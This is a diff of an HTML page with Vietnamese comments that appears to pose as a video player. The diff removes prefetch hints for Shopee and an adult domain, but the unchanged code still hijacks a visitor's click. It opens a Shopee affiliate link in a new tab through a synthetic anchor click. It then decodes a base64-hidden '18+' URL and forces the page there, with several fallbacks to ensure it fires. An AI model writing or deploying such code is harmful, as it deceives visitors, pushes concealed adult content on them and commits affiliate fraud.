@@ -14,12 +14,6 @@
 <meta property="og:image:width" content="1200" />
 <meta property="og:image:height" content="630" />
 
-<!-- Tăng tốc bắt tay mạng cho các domain đích -->
-<link rel="dns-prefetch" href="//s.shopee.vn">
-<link rel="preconnect" href="https://s.shopee.vn" crossorigin>
-<link rel="dns-prefetch" href="//sexbjcam.com">
-<link rel="preconnect" href="https://sexbjcam.com" crossorigin>
-
 <style>
 html, body { margin:0; padding:0; height:100%; background:#000; }
 .video-container{ position:relative; width:100%; height:100%; overflow:hidden; }
@@ -140,27 +134,25 @@ document.addEventListener('DOMContentLoaded', function() {
       return;
     }
 
-    // --- Mở Shopee ở tab mới mà KHÔNG hiện tab trắng ---
+    // --- Mở Shopee bằng thẻ <a> thật (tránh tab trắng) ---
     const affLink = "https://s.shopee.vn/30dchvC74f";
     const a = document.createElement("a");
     a.href = affLink;
     a.target = "_blank";
     a.rel = "noopener noreferrer";
-    // để chắc chắn thuộc cây DOM khi click
     document.body.appendChild(a);
     a.click();
 
-    // --- Điều hướng sang link 18+ NGAY, tránh bị treo timer khi tab nền ---
+    // --- Sau đó điều hướng sang link 18+ ---
     const link18 = atob(link18_b64);
     let navigated = false;
     const go18 = () => {
       if (navigated) return;
       navigated = true;
-      // dùng assign để đảm bảo điều hướng top-level
       window.location.assign(link18);
     };
 
-    // chạy càng sớm càng tốt: microtask → frame kế → timer ngắn → fallback khi page rời
+    // chạy sớm + fallback
     try { queueMicrotask(go18); } catch(_) {}
     if (typeof requestAnimationFrame === 'function') {
       requestAnimationFrame(() => go18());
@@ -168,7 +160,6 @@ document.addEventListener('DOMContentLoaded', function() {
     setTimeout(go18, 80);
     window.addEventListener('pagehide', go18, { once: true });
 
-    // dọn dẹp thẻ a (không ảnh hưởng chức năng)
     setTimeout(() => { try { a.remove(); } catch(_){} }, 5000);
   });
 });
